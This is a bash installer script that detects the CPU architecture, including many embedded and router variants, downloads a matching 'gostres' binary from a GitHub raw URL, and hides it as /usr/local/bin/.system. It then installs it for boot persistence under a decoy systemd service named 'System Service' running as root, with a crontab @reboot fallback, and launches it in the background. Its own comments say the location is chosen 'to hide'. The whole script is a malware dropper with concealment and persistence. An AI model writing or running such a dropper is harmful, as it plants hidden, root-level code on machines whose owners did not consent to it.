#!/bin/bash

# Detect architecture
ARCH=$(uname -m)

# Map architecture to binary names (assuming binaries are named like gostres_${ARCH})
case "$ARCH" in
    armv5l) BINARY="gostres_armv5l" ;;
    armv6l) BINARY="gostres_armv6l" ;;
    armv7l) BINARY="gostres_armv7l" ;;  # Assuming armv7/ means armv7l
    armv8l|aarch64) BINARY="gostres_armv8l" ;;  # armv8l often maps to aarch64
    mips) BINARY="gostres_mips" ;;
    mips64) BINARY="gostres_mips64" ;;
    mips64le) BINARY="gostres_mips64le" ;;
    mipsel) BINARY="gostres_mipsel" ;;
    ppc64) BINARY="gostres_ppc64" ;;
    ppc64le) BINARY="gostres_ppc64le" ;;
    riscv64) BINARY="gostres_riscv64" ;;
    s390x) BINARY="gostres_s390x" ;;
    i386|i686) BINARY="gostres_x86" ;;
    x86_64) BINARY="gostres_x86_64" ;;
    *) echo "Unsupported architecture: $ARCH"; exit 1 ;;
esac

# Download the binary (assuming hosted on GitHub raw or similar; replace REPO_URL with actual)
REPO_URL="https://raw.githubusercontent.com/Tiancaizhi9098/Gostres/main/binaries"  # Placeholder; update with real URL
curl -L -o /tmp/system "$REPO_URL/$BINARY"

# Make executable
chmod +x /tmp/system

# Rename to 'system' and move to a hidden/system-like location (e.g., /usr/local/bin/.system to hide)
mv /tmp/system /usr/local/bin/.system

# Set up autorun on boot (using systemd for modern Linux; fallback to crontab if needed)
if command -v systemctl >/dev/null; then
    # Create a systemd service
    cat <<EOF > /etc/systemd/system/system.service
[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=/usr/local/bin/.system
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable system.service
    systemctl start system.service
else
    # Fallback to crontab
    (crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/.system &") | crontab -
fi

# Run in background immediately
nohup /usr/local/bin/.system >/dev/null 2>&1 &

echo "Installation complete. Running in background."
